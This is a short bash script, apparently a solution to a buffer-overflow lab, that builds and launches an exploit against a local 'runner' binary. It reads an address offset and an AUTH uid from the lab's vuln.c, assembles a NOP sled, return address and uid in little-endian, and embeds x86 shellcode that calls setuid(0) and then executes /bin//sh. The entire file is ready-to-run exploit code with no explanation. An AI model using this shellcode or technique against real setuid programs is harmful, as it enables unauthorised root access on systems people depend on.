if [ $# -eq 0 ]; then
    echo "Usage: $0 <hex_address>"
    exit 1
fi

hex_address="$1"
hex_address="${hex_address#0x}"
hex_address=$(printf "%x\n" $((16#${hex_address} + 0x30)))

if [ ${#hex_address} -eq 7 ]; then
    hex_address="0${hex_address}"
fi

little_endian=""
for ((i = ${#hex_address} - 2; i >= 0; i -= 2)); do
    little_endian="${little_endian}\x${hex_address:i:2}"
done

source="$HOME/bof/vuln.c"

uid=$(grep "define AUTH" $source | awk '{print $NF}')

hex_uid=$(printf "%x" "$uid")

little_endian_uid=""
for ((i = ${#hex_uid} - 2; i >= 0; i -= 2)); do
    little_endian_uid="${little_endian_uid}\x${hex_uid:i:2}"
done

n_padding=$(grep -e "+[0-9]" $source | sed 's/.*+\([0-9]\+\)\].*/\1/')

pad1=$(printf '\x90%.0s' $(seq $(($n_padding + 22))))
pad2=$(printf '\x90%.0s' $(seq 16))
pad3=$(printf 'A%.0s' $(seq 6))

string_length="\x1"

shellcode="\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

exploit_string=$pad1$shellcode$pad2$little_endian$little_endian_uid$pad3$string_length

cd $HOME/bof

env - PWD=$PWD $HOME/bof/runner `echo -e $exploit_string`